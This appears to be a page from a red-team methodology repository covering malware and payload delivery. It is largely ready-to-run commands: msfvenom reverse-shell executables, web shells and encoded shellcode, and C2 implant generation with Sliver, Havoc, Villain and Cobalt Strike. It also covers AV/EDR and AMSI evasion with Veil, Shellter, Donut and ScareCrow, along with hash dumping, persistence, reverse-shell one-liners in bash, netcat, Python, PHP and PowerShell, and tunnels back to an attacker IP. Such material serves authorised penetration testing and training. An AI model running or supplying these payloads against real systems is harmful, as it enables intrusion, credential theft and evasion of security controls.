<div align="center">

| Previous Phase | Next Phase |
|:-------------------------------------------:|:---------------------------------------------:|
| [Exploitation](4.0-Exploitation.md) | [Post-Exploitattion](../5-Post-exploitation/5.0-Post-Exploitation.md) |

</div>

<br>
<br>
<br>


# Malware & Payload Delivery

This section covers tools for generating payloads, creating malware, establishing reverse shells, and delivering malicious content during red team engagements.

<br>

## Tools Reference Table

<p align="center">

| Tool | Category | Purpose | Link |
|:-----|:---------|:--------|:-----|
| [**Msfvenom**](#msfvenom) | Payload Generator | Generate various payloads | [Metasploit](https://www.metasploit.com/) |
| [**Metasploit**](#metasploit-framework) | Framework | Exploitation framework with handlers | [metasploit.com](https://www.metasploit.com/) |
| [**Cobalt Strike**](#cobalt-strike) | C2 Framework | Commercial adversary simulation | [cobaltstrike.com](https://www.cobaltstrike.com/) |
| [**Sliver**](#sliver) | C2 Framework | Open-source C2 framework | [GitHub](https://github.com/BishopFox/sliver) |
| [**Havoc**](#havoc) | C2 Framework | Modern C2 framework | [GitHub](https://github.com/HavocFramework/Havoc) |
| [**Villain**](#villain) | C2 Framework | Windows/Linux backdoor generator | [GitHub](https://github.com/t3l3machus/Villain) |
| [**Veil**](#veil) | Evasion | AV evasion framework | [GitHub](https://github.com/Veil-Framework/Veil) |
| [**Shellter**](#shellter) | Evasion | Dynamic PE infector | [shellterproject.com](https://www.shellterproject.com/) |
| [**Donut**](#donut) | Shellcode | .NET assembly to shellcode | [GitHub](https://github.com/TheWover/donut) |
| [**ScareCrow**](#scarecrow) | Evasion | EDR bypass payload generator | [GitHub](https://github.com/optiv/ScareCrow) |
| [**Netcat**](#netcat) | Reverse Shell | Network utility for shells | Built-in |
| [**Socat**](#socat) | Reverse Shell | Advanced netcat alternative | Built-in |
| [**Chisel**](#chisel) | Tunneling | TCP/UDP tunneling over HTTP | [GitHub](https://github.com/jpillora/chisel) |
| [**Ligolo-ng**](#ligolo-ng) | Tunneling | Advanced tunneling/pivoting | [GitHub](https://github.com/nicocha30/ligolo-ng) |
| [**Pwncat**](#pwncat) | Post-Exploit | Reverse shell handler & post-exploitation | [GitHub](https://github.com/calebstewart/pwncat) |

</p>

<br>


> **External References:**
> * [**Havoc C2**](https://github.com/HavocFramework/Havoc) - A modern, malleable Command & Control framework that serves as a strong alternative to Cobalt Strike.
> * [**Mythic**](https://github.com/its-a-feature/Mythic) - A collaborative, multi-platform C2 framework that allows you to plug in different agents (Medusa, Apfell, etc.).
> * [**Donut**](https://github.com/TheWover/donut) - A potent tool that generates position-independent shellcode from .NET Assemblies, PE files, and DLLs (essential for loading custom tools in memory).
> * [**PEzor**](https://github.com/phra/PEzor) - An advanced open-source shellcode wrapper/packer that integrates techniques like user-land hooking removal and syscall inlining to bypass EDRs.
> * [**Invoke-Obfuscation**](https://github.com/danielbohannon/Invoke-Obfuscation) - The premier tool for obfuscating PowerShell scripts to bypass signature-based detection.
> * [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) - A tool to identify exactly which bytes of your binary are triggering Windows Defender (helps you modify only the detected parts).
> * [**AMSITrigger**](https://github.com/RythmStick/AMSITrigger) - identifying which parts of your PowerShell script are being flagged by the Antimalware Scan Interface (AMSI).
> * [**LOLBAS Project**](https://lolbas-project.github.io/) - "Living Off The Land Binaries and Scripts." Essential for executing payloads using trusted, signed Microsoft binaries already on the system.
> * ***Practical Malware Analysis*** (Michael Sikorski) - While focused on defense, this is the gold standard for understanding how AVs analyze code. Knowing how to analyze malware teaches you how to hide it.
> * ***Rootkits and Bootkits*** (Alex Matrosov) - Deep dive into system internals, explaining how to persist at the kernel or boot level.
> * ***The Antivirus Hacker's Handbook*** (Joxean Koret) - A specific guide on understanding how antivirus engines work and how to identify weaknesses in them.


<br>
<br>
<br>

# Payload Generation

<br>

## Msfvenom
> *Part of Metasploit Framework: https://www.metasploit.com/*

Payload generator and encoder - combines msfpayload and msfencode.

### Windows Payloads

```bash
# Reverse shell (staged)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe

# Reverse shell (stageless)
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe

# x64 reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell64.exe

# Reverse shell (cmd)
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe

# DLL payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o malicious.dll

# MSI payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o shell.msi

# HTA payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh -o shell.hta
```

### Linux Payloads

```bash
# ELF reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf

# Shell reverse TCP
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf

# Python reverse shell
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -o shell.py

# Bash reverse shell
msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -o shell.sh
```

### Web Payloads

```bash
# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.php

# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.jsp

# WAR file
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o shell.war

# ASP reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp -o shell.asp

# ASPX reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx -o shell.aspx
```

### Shellcode Generation

```bash
# Raw shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shellcode.bin

# C shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f c

# Python shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f python

# PowerShell shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f psh

# C# shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f csharp
```

### Encoding & Evasion

```bash
# List encoders
msfvenom -l encoders

# Encode payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# Multiple encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 3 -e x86/alpha_mixed -i 2 -f exe -o multi_encoded.exe

# Avoid bad characters
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00\x0a\x0d" -f exe -o shell.exe
```

<p align="center">

| Option | Description |
|:-------|:------------|
| `-p` | Payload |
| `-f` | Output format |
| `-o` | Output file |
| `-e` | Encoder |
| `-i` | Encoder iterations |
| `-b` | Bad characters to avoid |
| `-a` | Architecture |
| `--platform` | Target platform |
| `-l` | List (payloads, encoders, formats) |
| `LHOST` | Listening host |
| `LPORT` | Listening port |

</p>

**Common Formats:**

<p align="center">

| Format | Description |
|:-------|:------------|
| `exe` | Windows executable |
| `elf` | Linux executable |
| `dll` | Windows DLL |
| `msi` | Windows installer |
| `raw` | Raw bytes |
| `c` | C code |
| `python` | Python code |
| `psh` | PowerShell |
| `asp` | ASP script |
| `aspx` | ASPX script |
| `jsp` | JSP script |
| `war` | Java WAR file |
| `hta-psh` | HTA with PowerShell |

</p>

<br>

## Metasploit Framework
> *Website: https://www.metasploit.com/*

Penetration testing framework with exploit modules and payload handlers.

### Starting Metasploit

```bash
# Start database
sudo systemctl start postgresql
sudo msfdb init

# Start msfconsole
msfconsole
```

### Handler Setup

```bash
# Multi/handler for reverse shells
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
run

# Background handler
exploit -j
```

### Meterpreter Commands

<p align="center">

| Command | Description |
|:--------|:------------|
| `sysinfo` | System information |
| `getuid` | Current user |
| `getsystem` | Attempt privilege escalation |
| `hashdump` | Dump password hashes |
| `shell` | Drop to system shell |
| `upload` | Upload file |
| `download` | Download file |
| `migrate` | Migrate to another process |
| `ps` | List processes |
| `screenshot` | Take screenshot |
| `keyscan_start` | Start keylogger |
| `portfwd` | Port forwarding |
| `run autoroute` | Set up pivoting |
| `background` | Background session |

</p>

### Post-Exploitation Modules

```bash
# Enumerate system
run post/windows/gather/enum_system

# Dump hashes
run post/windows/gather/hashdump

# Mimikatz
load kiwi
creds_all

# Persistence
run persistence -U -i 5 -p 443 -r <ATTACKER_IP>

# Pivot
run autoroute -s <SUBNET>
```

<br>

---

<br>

# Command & Control (C2)

<br>

## Sliver
> *GitHub: https://github.com/BishopFox/sliver*

Open-source cross-platform C2 framework.

### Server Setup

```bash
# Install
curl https://sliver.sh/install | sudo bash

# Start server
sliver-server

# Generate operator config
new-operator --name <NAME> --lhost <IP>
```

### Implant Generation

```bash
# Generate beacon (asynchronous)
generate beacon --mtls <IP>:443 --os windows --arch amd64 --save /tmp/beacon.exe

# Generate session (synchronous)
generate --mtls <IP>:443 --os windows --save /tmp/session.exe

# HTTP implant
generate beacon --http <IP>:80 --os windows --save /tmp/http_beacon.exe

# Shellcode
generate beacon --mtls <IP>:443 --os windows --format shellcode --save /tmp/shellcode.bin
```

### Listeners

```bash
# MTLS listener
mtls --lhost 0.0.0.0 --lport 443

# HTTP listener
http --lhost 0.0.0.0 --lport 80

# HTTPS listener
https --lhost 0.0.0.0 --lport 443 --domain <DOMAIN>

# DNS listener
dns --domains <DOMAIN>
```

### Commands

<p align="center">

| Command | Description |
|:--------|:------------|
| `sessions` | List sessions |
| `beacons` | List beacons |
| `use <ID>` | Interact with session/beacon |
| `info` | Session information |
| `shell` | Drop to shell |
| `upload` | Upload file |
| `download` | Download file |
| `execute-assembly` | Run .NET assembly |
| `sideload` | Load shared library |
| `pivots` | Manage pivots |

</p>

<br>

## Havoc
> *GitHub: https://github.com/HavocFramework/Havoc*

Modern, malleable C2 framework.

### Installation

```bash
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc/teamserver
go build
cd ../client
make
```

### Server

```bash
# Start teamserver
./teamserver server --profile ./profiles/havoc.yaotl -v

# Connect client
./Havoc
```

### Demon Generation

Generate payloads through the GUI or profile configuration:
- Windows EXE/DLL
- Shellcode
- Service executable

<br>

## Villain
> *GitHub: https://github.com/t3l3machus/Villain*

Windows & Linux backdoor generator with multi-session handler.

```bash
# Install
git clone https://github.com/t3l3machus/Villain.git
cd Villain
pip3 install -r requirements.txt

# Start
python3 Villain.py

# Generate Windows payload
generate os=windows lhost=<IP> obfuscate

# Generate Linux payload
generate os=linux lhost=<IP>

# List sessions
sessions

# Interact
shell <SESSION_ID>
```

<br>

## Cobalt Strike
> *Website: https://www.cobaltstrike.com/*

Commercial adversary simulation and red team operations platform.

### Team Server

```bash
# Start team server
./teamserver <IP> <PASSWORD>
```

### Beacon Generation

- **Stageless EXE/DLL**
- **PowerShell**
- **Raw Shellcode**
- **HTML Application (HTA)**

### Common Commands

<p align="center">

| Command | Description |
|:--------|:------------|
| `shell` | Execute command |
| `powershell` | Execute PowerShell |
| `execute-assembly` | Run .NET assembly |
| `inject` | Inject into process |
| `spawn` | Spawn new beacon |
| `jump` | Lateral movement |
| `mimikatz` | Run Mimikatz |
| `hashdump` | Dump hashes |
| `dcsync` | DCSync attack |

</p>

<br>

---

<br>

# Evasion Tools

<br>

## Veil
> *GitHub: https://github.com/Veil-Framework/Veil*

Generate AV-evading payloads.

```bash
# Install
git clone https://github.com/Veil-Framework/Veil.git
cd Veil
./config/setup.sh --force

# Run
./Veil.py

# List payloads
list

# Use payload
use <NUMBER>

# Generate
generate
```

<p align="center">

| Payload Type | Description |
|:-------------|:------------|
| `python/meterpreter/rev_tcp` | Python Meterpreter |
| `powershell/meterpreter/rev_tcp` | PowerShell Meterpreter |
| `cs/meterpreter/rev_tcp` | C# Meterpreter |
| `go/meterpreter/rev_tcp` | Go Meterpreter |

</p>

<br>

## Shellter
> *Website: https://www.shellterproject.com/*

Dynamic PE infector - inject shellcode into legitimate Windows executables.

```bash
# Run (interactive mode)
shellter

# Select operation: A (Automatic)
# PE Target: /path/to/legitimate.exe
# Payload: L (Listed) or C (Custom)
# Select payload (e.g., meterpreter_reverse_tcp)
# Set LHOST and LPORT
```

<p align="center">

| Mode | Description |
|:-----|:------------|
| `A` | Automatic - auto-inject shellcode |
| `M` | Manual - more control over injection |

</p>

<br>

## Donut
> *GitHub: https://github.com/TheWover/donut*

Generate position-independent shellcode from .NET assemblies, PE files, and DLLs.

```bash
# .NET assembly to shellcode
donut -f assembly.exe -o shellcode.bin

# With arguments
donut -f assembly.exe -a "arg1 arg2" -o shellcode.bin

# Specify method
donut -f assembly.dll -c ClassName -m MethodName -o shellcode.bin

# Bypass AMSI/WLDP
donut -f assembly.exe -b 3 -o shellcode.bin
```

<p align="center">

| Option | Description |
|:-------|:------------|
| `-f` | Input file |
| `-o` | Output file |
| `-a` | Arguments |
| `-c` | Class name |
| `-m` | Method name |
| `-b` | Bypass (1=none, 2=abort, 3=continue) |
| `-e` | Entropy (1=none, 2=random, 3=both) |

</p>

<br>

## ScareCrow
> *GitHub: https://github.com/optiv/ScareCrow*

EDR bypass payload generator using code signing and process injection.

```bash
# Generate loader
ScareCrow -I shellcode.bin -domain microsoft.com

# With process injection
ScareCrow -I shellcode.bin -Loader binary -injection "C:\Windows\System32\notepad.exe"

# DLL output
ScareCrow -I shellcode.bin -Loader dll -O payload.dll

# With sandbox evasion
ScareCrow -I shellcode.bin -sandbox
```

<p align="center">

| Option | Description |
|:-------|:------------|
| `-I` | Input shellcode file |
| `-Loader` | Loader type (binary, dll, control) |
| `-injection` | Process to inject into |
| `-domain` | Domain for code signing |
| `-O` | Output filename |
| `-sandbox` | Enable sandbox evasion |

</p>

<br>

---

<br>

# Reverse Shells

<br>

## Netcat
> *Built-in on most systems*

Swiss army knife for TCP/UDP connections.

### Listener

```bash
# Basic listener
nc -lvnp <PORT>

# With output to file
nc -lvnp <PORT> | tee output.txt
```

### Reverse Shells

```bash
# Bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

# Netcat (with -e)
nc -e /bin/bash <IP> <PORT>

# Netcat (without -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Shell Upgrade (TTY)

```bash
# Python
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Then
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

<br>

## Socat
> *Built-in on most systems*

Advanced netcat alternative with encryption support.

### Listener

```bash
# Basic listener
socat TCP-LISTEN:<PORT>,reuseaddr -

# Encrypted listener
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

# Full TTY listener
socat file:`tty`,raw,echo=0 tcp-listen:<PORT>
```

### Reverse Shell

```bash
# Basic
socat TCP:<IP>:<PORT> EXEC:/bin/bash

# Full TTY
socat TCP:<IP>:<PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

# Encrypted
socat OPENSSL:<IP>:<PORT>,verify=0 EXEC:/bin/bash
```

### Generate SSL Certificate

```bash
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem
```

<br>

## Pwncat
> *GitHub: https://github.com/calebstewart/pwncat*

Reverse shell handler with post-exploitation features.

```bash
# Install
pip install pwncat-cs

# Start listener
pwncat-cs -lp <PORT>

# Connect to bind shell
pwncat-cs <IP> <PORT>

# With specific platform
pwncat-cs -lp <PORT> -m linux
```

### Commands

<p align="center">

| Command | Description |
|:--------|:------------|
| `upload` | Upload file |
| `download` | Download file |
| `run` | Run module |
| `enumerate` | Run enumeration |
| `persist` | Install persistence |
| `privesc` | Attempt privilege escalation |

</p>

<br>

---

<br>

# Tunneling & Pivoting

<br>

## Chisel
> *GitHub: https://github.com/jpillora/chisel*

TCP/UDP tunnel over HTTP with SSH encryption.

### Server (Attacker)

```bash
# Start server
chisel server -p 8080 --reverse
```

### Client (Target)

```bash
# Reverse port forward
chisel client <ATTACKER_IP>:8080 R:8001:127.0.0.1:8001

# SOCKS proxy
chisel client <ATTACKER_IP>:8080 R:1080:socks
```

<p align="center">

| Option | Description |
|:-------|:------------|
| `server` | Run as server |
| `client` | Run as client |
| `-p` | Listen port |
| `--reverse` | Allow reverse tunnels |
| `R:` | Remote port forward |
| `socks` | SOCKS5 proxy |

</p>

<br>

## Ligolo-ng
> *GitHub: https://github.com/nicocha30/ligolo-ng*

Advanced tunneling/pivoting tool using TUN interfaces.

### Proxy (Attacker)

```bash
# Create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start proxy
./proxy -selfcert
```

### Agent (Target)

```bash
# Connect to proxy
./agent -connect <ATTACKER_IP>:11601 -ignore-cert
```

### Session Commands

```bash
# List sessions
session

# Select session
session <ID>

# Start tunnel
start

# Add route on attacker
sudo ip route add <TARGET_NETWORK> dev ligolo
```

<br>

---

<br>
<br>

<div align="center">

| Previous Phase | Next Phase |
|:-------------------------------------------:|:---------------------------------------------:|
| [Exploitation](4.0-Exploitation.md) | [Post-Exploitattion](../5-Post-exploitation/5.0-Post-Exploitation.md) |

</div>
